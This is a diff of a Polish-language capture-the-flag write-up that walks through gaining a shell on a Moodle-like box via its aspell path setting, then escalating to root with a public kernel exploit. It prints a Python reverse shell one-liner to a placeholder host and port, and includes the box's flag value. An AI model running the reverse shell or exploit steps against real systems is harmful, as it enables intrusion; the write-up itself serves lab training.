@@ -243,6 +243,71 @@ W miejsce "Path to aspell" wstawiamy reverse shell'a:
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
 
+Następnie wyszukujemy słowo "spell" i zmieniamy "Spell engine" na "PSpellShell":
+
+![Spell](img/Spell.JPG)
+
 Po zapisaniu zmian odpalamy nasłuchiwanie na wybranym porcie:
 
 ![Nc](img/Nc.JPG)
+
+Przechodzimy kolejno do: Navigation -> My profile -> Blogs -> Add a new entry. Po wpisaniu tytułu i treści klikamy przycisk zgodnie ze strzałką, który sprawdza pisownie treści naszego bloga i odpala podstawionego przez nas wcześniej reverse shell'a:
+
+![Check](img/Check.JPG)
+
+Stabilizujemy shell'a i mamy kontakt z serwerem:
+
+![Shell](img/Shell.JPG)
+
+## Zwiększenie poziomu uprawnień
+
+Sprawdzamy wersję kernela:
+
+![Kernel](img/Kernel.JPG)
+
+```
+3.13.0-32-generic
+```
+
+Wgrywamy [linpeas'a](https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1) i go odpalamy:
+
+![Linpeas](img/Linpeas.JPG)
+
+Widzimy, że na 95% ta wersja Linuxa jest podatna:
+
+![95](img/95.JPG)
+
+Szukamy exploit'a:
+
+![CVE](img/CVE.JPG)
+
+Pobieramy [exploit'a](https://www.exploit-db.com/exploits/37292) i wgrywamy go na atakowaną maszynę. Po odpaleniu zgodnie z instrukcją napotykamy na problem:
+
+![Gcc](img/Gcc.JPG)
+
+Widzimy, że pakiet "ggc" nie jest zainstalowany. Sprawdzamy, czy w systemie jest zainstalowany pakiet "cc":
+
+![CC](img/CC.JPG)
+
+Edytujemy exploit'a, aby działał na atakowanym systemie (zmieniamy "gcc" na "cc"):
+
+![V2](img/V2.JPG)
+
+Wgrywamy poprawioną wersję (V2) exploit'a i odpalamy go zgodnie z instrukcją:
+
+![Root](img/Root.JPG)
+
+Właśnie zdobyliśmy uprawnienia root'a. Odczytujemy flagę z pliku .flag.txt:
+
+![Flag1](img/Flag1.JPG)
+
+```
+568628e0d993b1973adc718237da6e93
+```
+
+Przechodzimy do końcowej lokalizacji:
+
+![Final](img/Final.JPG)
+
+Do zobaczenia na kolejnych CTF-ach!
+
